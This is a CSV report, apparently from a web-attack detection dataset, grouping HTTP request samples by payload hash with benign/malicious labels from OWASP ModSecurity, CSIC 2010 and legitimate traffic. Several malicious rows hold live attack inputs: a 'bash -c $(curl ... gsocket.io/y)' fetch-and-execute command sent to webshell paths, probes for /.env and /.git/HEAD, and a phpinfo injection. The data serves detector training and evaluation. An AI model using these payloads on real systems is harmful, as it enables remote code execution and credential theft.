"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"payload_family_hash","6add32f42cb04b7c9ecc904e","9","0","openappsec_legitimate","normal","norm_legitimate_002505|norm_legitimate_002478|norm_legitimate_002489|norm_legitimate_002471|norm_legitimate_002523|norm_legitimate_002488|norm_legitimate_002522|norm_legitimate_002524|norm_legitimate_002472","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4a90v886006994z8851582372za200zb851582372&_p=1728584910503&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101533421~101671035~101686685~101823848&cid=2011390197.1728584616&ecid=1345560689&ul=en-us&sr=1536x864&ur=BD-C&uaa=x86&uab=64&uafvl=Google%2520Chrome%3B129.0.6668.90%7CNot%253"
"payload_family_hash","9727ec32343705e44b315cf6","9","1","owasp_modsecurity","owasp_sqli:933160|owasp_sqli:942100","pos_owasp_modsec_000450|pos_owasp_modsec_000822|pos_owasp_modsec_001574|pos_owasp_modsec_000561|pos_owasp_modsec_001064|pos_owasp_modsec_001129|pos_owasp_modsec_001687|pos_owasp_modsec_001642|pos_owasp_modsec_000173","POST","/d_7dd3b010",""
"payload_family_hash","973732c2f7de60ae962c9097","9","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001972|norm_modsec_learn_001968|norm_modsec_learn_001967|norm_modsec_learn_001971|norm_modsec_learn_001975|norm_modsec_learn_001970|norm_modsec_learn_001974|norm_modsec_learn_001973|norm_modsec_learn_001969","GET","/","name=PMC_UPP&level=METRIC&message=session_pending&success=true&msg=session_pending&timestamp=1663172485486&resource=%2F%2Fwww.shutterfly.com%2Fapplication%2Flog.gif&logSession=cff6a8d5-0658-4800-ba1d-9ea683b2a7c1&user_os=windows&user_browser=chrome&upload_size=22390&guid=de35aa33-d1c0-4b4e-b65b-8e8b"
"payload_family_hash","b785e979fafcc6d48692fd5d","9","0","openappsec_legitimate","normal","norm_legitimate_001933|norm_legitimate_001931|norm_legitimate_001907|norm_legitimate_001893|norm_legitimate_001918|norm_legitimate_001932|norm_legitimate_001904|norm_legitimate_001898|norm_legitimate_001889","POST","/bulk",""
"payload_family_hash","c293766de1745c7371e823cc","9","0","openappsec_legitimate","normal","norm_legitimate_000903|norm_legitimate_001506|norm_legitimate_000852|norm_legitimate_001388|norm_legitimate_001467|norm_legitimate_000926|norm_legitimate_001458|norm_legitimate_001430|norm_legitimate_000887","POST","/",""
"payload_family_hash","c807293cc5de6e46df55347a","9","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001342|pos_owasp_modsec_002398|pos_owasp_modsec_000557|pos_owasp_modsec_001291|pos_owasp_modsec_000334|pos_owasp_modsec_001949|pos_owasp_modsec_000132|pos_owasp_modsec_001902|pos_owasp_modsec_001240","GET","/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","e8bff77bdc10d3c42e6a887e","9","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_000366|pos_owasp_modsec_000340|pos_owasp_modsec_001768|pos_owasp_modsec_001445|pos_owasp_modsec_000694|pos_owasp_modsec_001887|pos_owasp_modsec_000067|pos_owasp_modsec_000829|pos_owasp_modsec_000335","GET","/wp-includesSimplePiegzdecodes.php",""
"payload_family_hash","083deaf71d7db3941b0f8ed5","8","0","openappsec_legitimate","normal","norm_legitimate_001790|norm_legitimate_001791|norm_legitimate_001793|norm_legitimate_001789|norm_legitimate_001795|norm_legitimate_001788|norm_legitimate_001794|norm_legitimate_001792","POST","/recs/v1/precs/preconfigured",""
"payload_family_hash","0fdd868b8072ec3b0250dc34","8","0","openappsec_legitimate","normal","norm_legitimate_001925|norm_legitimate_001916|norm_legitimate_001890|norm_legitimate_001902|norm_legitimate_001928|norm_legitimate_001923|norm_legitimate_001896|norm_legitimate_001882","POST","/bulk",""
"payload_family_hash","50b60ae7ee8c92ef3f98a245","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000686|norm_modsec_learn_002388|norm_modsec_learn_000090|norm_modsec_learn_002389|norm_modsec_learn_000687|norm_modsec_learn_002390|norm_modsec_learn_000689|norm_modsec_learn_000688","GET","/","cb=1663165315629"
"payload_family_hash","562320f1d9fe3c5924a2d22d","8","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001545|norm_modsec_learn_001465|norm_modsec_learn_001538|norm_modsec_learn_001532|norm_modsec_learn_001453|norm_modsec_learn_001523|norm_modsec_learn_001454|norm_modsec_learn_001521","GET","/","random=557321331&cv=9&fst=1662450250522&num=1&npa=1&label=LYJzCNXEwusBELi-itUC&guid=ON&resp=GooglemKTybQhCsO&eid=375603261&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=4&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F3801950.fls.doubleclick.net%2Factivityi%3Bdc_p"
"payload_family_hash","a9b59d78704195515fdb7463","8","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002038|pos_owasp_modsec_002379|pos_owasp_modsec_001972|pos_owasp_modsec_001408|pos_owasp_modsec_002063|pos_owasp_modsec_001771|pos_owasp_modsec_001251|pos_owasp_modsec_000015","GET","/d_42a4d7a0/d_3e6ca509/webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","f24b7f382fc792fa3682addf","8","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_002198|pos_owasp_modsec_002041|pos_owasp_modsec_002082|pos_owasp_modsec_001923|pos_owasp_modsec_002295|pos_owasp_modsec_001702|pos_owasp_modsec_002913|pos_owasp_modsec_000206","GET","/d_3b1ec613/d_bd205cb5/gzdecode.php",""
"payload_family_hash","2f9123a557d4a40c447c81b7","7","0","openappsec_legitimate","normal","norm_legitimate_001718|norm_legitimate_001711|norm_legitimate_001727|norm_legitimate_001762|norm_legitimate_001778|norm_legitimate_001744|norm_legitimate_001780","GET","/customer/section/load/","sections=messages&force_new_section_timestamp=true&_=1728347352962"
"payload_family_hash","35d851e0aa55104109862b43","7","0","openappsec_legitimate","normal","norm_legitimate_000729|norm_legitimate_000774|norm_legitimate_000739|norm_legitimate_000730|norm_legitimate_000895|norm_legitimate_000775|norm_legitimate_000896","POST","/personalizationengine",""
"payload_family_hash","6bdc4d85577a09339e367854","7","0","openappsec_legitimate","normal","norm_legitimate_000883|norm_legitimate_000884|norm_legitimate_000937|norm_legitimate_000935|norm_legitimate_000979|norm_legitimate_001203|norm_legitimate_000983","POST","/p",""
"payload_family_hash","743720030e22f4ff382579eb","7","0","openappsec_legitimate","normal","norm_legitimate_002797|norm_legitimate_002795|norm_legitimate_002792|norm_legitimate_002793|norm_legitimate_002798|norm_legitimate_002794|norm_legitimate_002796","POST","/pharos",""
"payload_family_hash","aeff0a1bcadb42836db8916c","7","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000971|pos_owasp_modsec_000488|pos_owasp_modsec_000274|pos_owasp_modsec_000186|pos_owasp_modsec_001506|pos_owasp_modsec_001625|pos_owasp_modsec_000252","GET","/d_873adb73/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","ce9e15985e9abf6cd1e0bcdb","7","0","openappsec_legitimate","normal","norm_legitimate_002577|norm_legitimate_002583|norm_legitimate_002579|norm_legitimate_002564|norm_legitimate_002563|norm_legitimate_002555|norm_legitimate_002551","POST","/tracking/jitney/logging/messages",""
"payload_family_hash","db0c7a10df9df124c7708806","7","0","openappsec_legitimate","normal","norm_legitimate_002527|norm_legitimate_002519|norm_legitimate_002521|norm_legitimate_002528|norm_legitimate_002525|norm_legitimate_002529|norm_legitimate_002526","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4a90v886006994za200zb851582372&_p=1728585010917&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101533421~101671035~101686685~101823848&cid=2011390197.1728584616&ecid=1345560689&ul=en-us&sr=1536x864&ur=BD-C&uaa=x86&uab=64&uafvl=Google%2520Chrome%3B129.0.6668.90%7CNot%253DA%253FBran"
"payload_family_hash","dcfe7ba2bff9182f85f39143","7","1","owasp_modsecurity","owasp_php_injection:933160","pos_owasp_modsec_001792|pos_owasp_modsec_002668|pos_owasp_modsec_001484|pos_owasp_modsec_002307|pos_owasp_modsec_001865|pos_owasp_modsec_001762|pos_owasp_modsec_002409","GET","/index.php","=phpinfo()"
"payload_family_hash","e06dec7ceddb29661fc66584","7","0","openappsec_legitimate","normal","norm_legitimate_002431|norm_legitimate_002520|norm_legitimate_002430|norm_legitimate_002470|norm_legitimate_002479|norm_legitimate_002473|norm_legitimate_002469","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4a90v886006994za200zb851582372&_p=1728584606285&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101533421~101671035~101686685~101823848&cid=2011390197.1728584616&ecid=1345560689&ul=en-us&sr=1536x864&ur=BD-C&uaa=x86&uab=64&uafvl=Google%2520Chrome%3B129.0.6668.90%7CNot%253DA%253FBran"
"payload_family_hash","e656d83a3cc5d0bcb8da56e3","7","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002509|norm_modsec_learn_002485|norm_modsec_learn_002486|norm_modsec_learn_001335|norm_modsec_learn_000811|norm_modsec_learn_001318|norm_modsec_learn_002487","GET","/","id=366846232163754&ev=PageView&dl=https%3A%2F%2Fwww.xplorer.co.il%2Ftmarket%2Fflights&rl=&if=false&ts=1660204464553&sw=1920&sh=1080&v=2.9.73&r=stable&ec=0&o=30&fbp=fb.2.1660204464552.487685258&it=1660204463580&coo=false&rqm=GET"
"payload_family_hash","f1786722930aff1de2930a16","7","1","csic_2010","csic_anomalous","pos_csic_000143|pos_csic_002360|pos_csic_000130|pos_csic_002703|pos_csic_001925|pos_csic_000349|pos_csic_000082","POST","/tienda1/publico/pagar.jsp",""
"payload_family_hash","0868367769b1d222f5f59d00","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002902|norm_modsec_learn_002901|norm_modsec_learn_002904|norm_modsec_learn_002900|norm_modsec_learn_002903|norm_modsec_learn_002899","GET","/","width=350&url=https://www.terminalx.com/pub/media/catalog/product/z/2/z253350011-11652961936.jpg"
"payload_family_hash","2856bed3688a1d2bb0b6956e","6","0","openappsec_legitimate","normal","norm_legitimate_000232|norm_legitimate_000253|norm_legitimate_000266|norm_legitimate_000269|norm_legitimate_000250|norm_legitimate_000272","POST","/rb_bf04553ytd","type=js3&sn=v_4_srv_8_sn_8D599C6152B1E85EB675338EEAE8B92B_perc_100000_ol_0_mul_1_app-3A8b2a7e44ceb3fcd4_1_app-3A165a5cc5c5fd7c11_1_rcs-3Acss_0&svrid=8&flavor=post&vi=CTQAIUEDFOKQVBNOJJKPQWVFHARARKRU-0&contentType=srBm&modifiedSince=1728321678686&rf=https%3A%2F%2Fwww.aa.com%2Fi18n%2Fmoresearch.jsp%3F"
"payload_family_hash","2bd1f58059ba1eeb59254d99","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001058|norm_modsec_learn_001060|norm_modsec_learn_001059|norm_modsec_learn_001057|norm_modsec_learn_001055|norm_modsec_learn_001056","GET","/","v=1&_v=j96&a=714867469&t=event&ni=1&cu=ILS&_s=1&dl=https%3A%2F%2Fwww.footlocker.co.il%2Fyouth%2Fshoes%2Fsneakers%2Fcat%3Fcategory_id%3D610a9715af82d10008a87535&ul=en-us&de=UTF-8&dt=Foot%20Locker%20%7C%20%D7%A1%D7%A0%D7%99%D7%A7%D7%A8%D7%A1&sd=24-bit&sr=1920x1080&vp=1920x969&je=0&ec=Ecommerce&ea=prod"
"payload_family_hash","2dab1952c6584af678fe1aed","6","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_001278|pos_owasp_modsec_002129|pos_owasp_modsec_000121|pos_owasp_modsec_000591|pos_owasp_modsec_002497|pos_owasp_modsec_000326","GET","/admin/.env",""
"payload_family_hash","32f088023629cc807bdd656a","6","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_000411|pos_owasp_modsec_001556|pos_owasp_modsec_001631|pos_owasp_modsec_002452|pos_owasp_modsec_000525|pos_owasp_modsec_000383","GET","/.git/HEAD",""
"payload_family_hash","36c658ba2555acc493fc5504","6","0","openappsec_legitimate","normal","norm_legitimate_001938|norm_legitimate_001899|norm_legitimate_001868|norm_legitimate_001934|norm_legitimate_001910|norm_legitimate_001919","GET","/webxp/data/modifications/8b720254-07a6-11ed-9a28-66d099ccda36/aa3e736e-c5eb-454e-90b5-311750fdc562/v1","http-referer=https%3A%2F%2Fwww.ae.com%2Fus%2Fen&allModifications=true&trigger=page_load"
"payload_family_hash","385e37d92b2a63960768443d","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001546|norm_modsec_learn_001463|norm_modsec_learn_001507|norm_modsec_learn_001554|norm_modsec_learn_001456|norm_modsec_learn_001552","GET","/","random=623061315&cv=9&fst=1660632489673&num=1&npa=1&label=vf7ECKya1_kCELm7psAC&guid=ON&resp=GooglemKTybQhCsO&eid=375603261&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=9&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F9731995.fls.doubleclick.net%2Factivityi%3Bdc"
"payload_family_hash","45665460c62b0dcf90b94985","6","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001102|pos_owasp_modsec_000841|pos_owasp_modsec_001540|pos_owasp_modsec_000473|pos_owasp_modsec_000530|pos_owasp_modsec_000154","GET","/d_ebec15cd/d_eda37985/d_9a52310f/d_a9b36e7e/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","6a5a1fef267b329bd3e3c776","6","0","openappsec_legitimate","normal","norm_legitimate_001745|norm_legitimate_001715|norm_legitimate_001728|norm_legitimate_001785|norm_legitimate_001763|norm_legitimate_001786","POST","/recs/v1/precs/preconfigured",""
"payload_family_hash","6e6370bff829544499fd7f68","6","1","csic_2010","csic_anomalous","pos_csic_001899|pos_csic_001655|pos_csic_000651|pos_csic_000479|pos_csic_001126|pos_csic_002517","GET","/tienda1/publico/anadir.jsp","id=3&nombreA=Vino+Rioja&precio=85&cantidad=55&B1=A%F1adir+al+carrito"
"payload_family_hash","80b02592eec1c34244f24c6b","6","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002484|pos_owasp_modsec_001539|pos_owasp_modsec_002451|pos_owasp_modsec_001907|pos_owasp_modsec_002284|pos_owasp_modsec_002666","GET","/d_e08f6bed/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","926ff47d99ef9376cc3da730","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001630|norm_modsec_learn_001627|norm_modsec_learn_001628|norm_modsec_learn_001629|norm_modsec_learn_001632|norm_modsec_learn_001631","GET","/","type=js3&sn=v_4_srv_7_sn_V7L4M63QGJGSJND03DUIK7NUPH9H1T9A_app-3A86d30a3c849a4502_1_ol_0_perc_100000_mul_1&svrid=7&flavor=cors&vi=TCFCDRFUHGQCAKSAHUCMOMCMCKMHBQMG-0&modifiedSince=1662433952028&rf=https%3A%2F%2Fwww.next.co.il%2Fhe%2Fshop%2Fgender-women-category-jeans%2Fisort-price&bp=3&app=86d30a3c849"
"payload_family_hash","9532a49c73a6a1b7e84a5745","6","1","csic_2010","csic_anomalous","pos_csic_000975|pos_csic_001458|pos_csic_000599|pos_csic_000557|pos_csic_000393|pos_csic_002373","GET","/tienda1/publico/pagar.jsp","modo=insertar&precio=3532&B1A=Pasar+por+caja"
"payload_family_hash","977c16bc50d8a7bf16ed7088","6","0","openappsec_legitimate","normal","norm_legitimate_001901|norm_legitimate_001869|norm_legitimate_001936|norm_legitimate_001921|norm_legitimate_001912|norm_legitimate_001940","POST","/managed-tags/show",""
"payload_family_hash","bfc0e2a85d375f0a0535768b","6","0","openappsec_legitimate","normal","norm_legitimate_002476|norm_legitimate_002468|norm_legitimate_002477|norm_legitimate_002427|norm_legitimate_002467|norm_legitimate_002428","GET","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4a90v886006994z8851582372za200zb851582372&_p=1728584911726&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101533421~101671035~101686685~101823848&cid=2011390197.1728584616&ecid=1345560689&ul=en-us&sr=1536x864&ur=BD-C&uaa=x86&uab=64&uafvl=Google%2520Chrome%3B129.0.6668.90%7CNot%253"
"payload_family_hash","c23ed53b78941bae70297234","6","1","csic_2010","csic_anomalous","pos_csic_000260|pos_csic_002994|pos_csic_000758|pos_csic_002251|pos_csic_000817|pos_csic_000822","GET","/tienda1/publico/anadir.jsp","id=2&nombre=Queso+Manchego&precio=100&cantidadA=29&B1=A%F1adir+al+carrito"
"payload_family_hash","f7384d0af14c93f11df2305d","6","0","openappsec_legitimate","normal","norm_legitimate_002144|norm_legitimate_002316|norm_legitimate_002315|norm_legitimate_002143|norm_legitimate_002145|norm_legitimate_002317","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4730v886006994z8851582372za200zb851582372&_p=1720601353709&gcd=13l3l3l3l1&npa=0&dma=0&tag_exp=0&cid=455635995.1720601296&ecid=1679094175&ul=en-us&sr=1920x1080&ur=US-VA&uaa=x86&uab=64&uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B126.0."
"payload_family_hash","fc616f4f01562da7f0f2fb92","6","0","openappsec_legitimate","normal","norm_legitimate_000915|norm_legitimate_000920|norm_legitimate_000961|norm_legitimate_000827|norm_legitimate_000829|norm_legitimate_000950","GET","/td/rul/986797384","random=1719747572791&cv=11&fst=1719747572791&fmt=3&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&hn=www.googleadservices.com&frm=0&tiba=%F0%9F%91%95Kids%27%20Shoes%20and%20Clothing%20%7C%20adidas%2"
"payload_family_hash","fd7759797b2051c600b975ac","6","0","openappsec_legitimate","normal","norm_legitimate_000921|norm_legitimate_000919|norm_legitimate_000828|norm_legitimate_000830|norm_legitimate_000964|norm_legitimate_000963","GET","/pagead/viewthroughconversion/986797384/","random=1719747572824&cv=11&fst=1719747572824&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&hn=www.googleadservices.com&frm=0&tiba=%F0%9F%91%95Kids%27%20Shoes%20and%20Clothing%20%7C%20adidas%20US%F0"
"payload_family_hash","fe1d0dc0080cd0d534c88de9","6","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002748|norm_modsec_learn_000457|norm_modsec_learn_000450|norm_modsec_learn_002170|norm_modsec_learn_002754|norm_modsec_learn_002174","GET","/","t=1650446775971"
"payload_family_hash","fe61a1d63f0a13d9f32dfee2","6","0","openappsec_legitimate","normal","norm_legitimate_001310|norm_legitimate_001368|norm_legitimate_001361|norm_legitimate_002643|norm_legitimate_000153|norm_legitimate_001509","POST","/domainreliability/upload",""
"payload_family_hash","01cb9f05dc8f02b450903686","5","1","owasp_modsecurity","owasp_lfi_rfi:920450|owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_002164|pos_owasp_modsec_000628|pos_owasp_modsec_002489|pos_owasp_modsec_001314|pos_owasp_modsec_000875","GET","/backend/.env",""
"payload_family_hash","0d1786b3f8d0b098aa060ab2","5","0","openappsec_legitimate","normal","norm_legitimate_002380|norm_legitimate_002366|norm_legitimate_002348|norm_legitimate_002383|norm_legitimate_002373","POST","/af",""
"payload_family_hash","2f237ff906f5620e68b6d419","5","1","csic_2010","csic_anomalous","pos_csic_002748|pos_csic_000678|pos_csic_001819|pos_csic_002369|pos_csic_000972","GET","/tienda1/publico/pagar.jsp","modoA=insertar&precio=8305&B1=Confirmar"
